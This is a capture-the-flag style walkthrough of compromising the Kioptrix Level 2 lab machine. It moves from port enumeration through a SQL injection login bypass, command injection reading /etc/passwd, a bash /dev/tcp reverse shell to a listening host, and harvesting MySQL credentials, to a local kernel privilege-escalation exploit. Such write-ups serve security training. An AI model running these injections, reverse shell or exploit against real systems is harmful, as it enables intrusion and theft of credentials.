# Kioptrix Level 2


### Checking File Integrity

<li>
  First to be sure file has not been tampered we can check file hash after downloading box from <a href="https://www.vulnhub.com/">vulnhub.com</a>
</li>
</br>

```js
Get-FileHash '.\Kioptrix_Level_2-update.rar' -Algorithm MD5

Algorithm       Hash                                                                   
---------       ----                                                                   
MD5             987FFB98117BDEB6CA0AAC6EA22E755D
```

<li>Which we can see matches the one on vulnhub box describtion
  
![image](https://user-images.githubusercontent.com/85706972/186980686-481f15bf-4b16-43cd-92a7-4ea0eba6e591.png)
  
<li> To be double sure file has not been tampered we can also use <a href="https://www.virustotal.com/gui/file/e7b6d660bf3802accfe327751819e04a7ed177449a523daf8e2b2a4e03755af5/community">VirusTotal</a>

</br>

### BlackBox Pen-Testing

<li>
  After we have succefully imported the box and turned it on, we are ready to attack it, but we must perform IP recon to know our target, This can be easiliy achieved with simple ARP scan or using NMAP
</li>

</br>

```js
arp-scan -l
nmap -sn -vv IP/CIDR #Ping Scan over all hosts on network
netdiscover #Sends ARP requests on the network
```

### Enumeration

<li> Starting with simple ICMP ping check to see if the box is alive
</br>

```js
ping 192.168.14.131
PING 192.168.14.131 (192.168.14.131) 56(84) bytes of data.
64 bytes from 192.168.14.131: icmp_seq=1 ttl=64 time=0.363 ms
64 bytes from 192.168.14.131: icmp_seq=2 ttl=64 time=0.307 ms
64 bytes from 192.168.14.131: icmp_seq=3 ttl=64 time=0.434 ms
```

<li> TTL 64 is telling us that we might be attacking Linux box, more on TTL values <a href="https://subinsb.com/default-device-ttl-values/">here</a>

### NMAP Scan
  
<li>NMAP All port scan

</br>

```js
nmap --min-rate=1000 -p- -T4 -Pn 192.168.14.131 -v | tee nmap/initial_all_ports

Nmap scan report for 192.168.14.131
Host is up (0.0032s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
1002/tcp open  windows-icfw
3306/tcp open  mysql
```


<li> Service Detection and Version Detection scan
</br>
  
```js
nmap -sV -sC -p 22,80,111,443,631,1002,3306 -v 192.168.14.131 | tee nmap/port_enum

22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            999/udp   status
|_  100024  1           1002/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_ssl-date: 2022-08-24T16:37:24+00:00; -3h09m39s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
1002/tcp open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:E6:96:56 (VMware)

Host script results:
|_clock-skew: -3h09m39s
  
```
</br>
<ul>
  <li>NMAP shows that OS we are working with is CentOS</li>
  <li>HTTP and HTTPs have installed Apache 2.0.52 (Very old)</li>
  <li>631/tcp open ipp CUPS 1.1 - Which have malicious action enabled PUT</li>
  <li>3306/tcp open mysql MySQL (unauthorized) - We might be working with some database data</li>
</ul> 


### HTTP Enumeration

<li> Browsing page on HTTP we are introduced with login form
  
  ![image](https://user-images.githubusercontent.com/85706972/186985238-858535bc-e878-4a47-9697-dba02b5419fa.png)

<li> Before we attempt anything I like to setup BURP crawler and run gobuster for any interesting directory we found

<li> Gobuster Scan 
  
```js
  ===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.14.131
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/08/24 16:00:33 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 667]
/manual               (Status: 301) [Size: 317] [--> http://192.168.14.131/manual/]
/usage                (Status: 403) [Size: 287]                                    
===============================================================
2022/08/24 16:04:08 Finished
===============================================================
 ```
 
<ul>
  <li>Also we got redirected to index.php so we can add extensions for php pages in gobuster scan</li>
  <li>As we had open MySQL port and we have login format, maybe this page is vulnerable to SQL injection</li>
  <li>We intercept the login form and setup intruder brute force with SQL injection payloads which eventually gets us further</li>
</ul>
  
  Requests
  
 ```js
  uname=admin'%20%23&psw=1%20or%201%3d1%20&btnLogin=Login
 ```
  
  Response
  
  <li> We got redirected to new page
  
  ![image](https://user-images.githubusercontent.com/85706972/186989256-6fa90537-ac1b-47c8-92d8-6f025ca3698d.png)

  
  
 ### Command Injection Vulnerability
 
 <li> Lets test this form by trying to ping our machine IP
   
   ![image](https://user-images.githubusercontent.com/85706972/186989767-3a210bdf-5ab5-4890-93ea-0993f0849333.png)

 <li> Now we can try to abuse this field to possibly get any other command executed
   
 ```js
 &id
 ```
 ![image](https://user-images.githubusercontent.com/85706972/186990314-2e769adf-97c5-47ac-8788-6d4415c8e341.png)
 
 <li>Next we can read the /etc/passwd file to get idea of users who we might steal SSH key as SSH port was open
 
  ```js
  &cat /etc/passwd
  ```
![image](https://user-images.githubusercontent.com/85706972/186990479-a535ac65-bf70-4842-a0b1-de32c5b07aa9.png)

 <li>Users on box
  
   ```js
   john
   harold
   ```
 <li>Tried to steal the SSH key from both users, but nothing came back as we might not have access over home directories of users
 <li> Using command injection vulnerability in php we can inject reverse shell which we are going to catch on netcat
 
 ```js
 1. nc -lvnp 4242
 2. &bash -i >& /dev/tcp/192.168.14.129/4242 0>&1
 ```
   ![image](https://user-images.githubusercontent.com/85706972/186991150-dd98ffc4-37b3-4d17-a64a-de596dc896fb.png)

 ### Privilege Escalation
   
 <li> We can inspect both vulnerable .php files and the index.php contains login information of mysql database
   
   ![image](https://user-images.githubusercontent.com/85706972/186991477-5f0b7e5e-84d1-4f07-b9ab-ca0f128ed67d.png)

 ```js
  username > john
  password > hiroshima
 ```
 <li> We can now login into MySQL and query rest of the credentials
   
```js
 mysql -u john -h localhost -p
```
<li> Now that we are in we can query the databases and tables
 
  ![image](https://user-images.githubusercontent.com/85706972/186992076-a9a20475-cb48-48cc-a9e3-f17c8492eda9.png)

 ```js
  admin > 5afac8d85f 
  john >  66lajGGbla
 ```
<li>Password seemed to be encrypted and couldn't crack them, had idea to change them but that did not changed anything as we only change that in DB
<li> Doing basic enumeration of Linux box, found that:
 
 <ol>
   <li>Kernel version - 2.6.9-55.EL</li>
   <li>OS Information:</li>
</ol> 
 
```js
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5
Codename:       Final
```

<li>Using searchspoit we found that box is vulnerable to local privilege escalation exploit <a href="https://subinsb.com/default-device-ttl-values/](https://www.exploit-db.com/exploits/9545">CVE-2009-2692</a>
 
 ```js
searchsploit -m linux/local/9545.c
#transfer exploit over to box
gcc -o exploit 9545.c
 ```
  
![image](https://user-images.githubusercontent.com/85706972/186993487-c647618b-82f8-456d-a5e1-9026322ec90a.png)

<li> And we are root
 
  
 
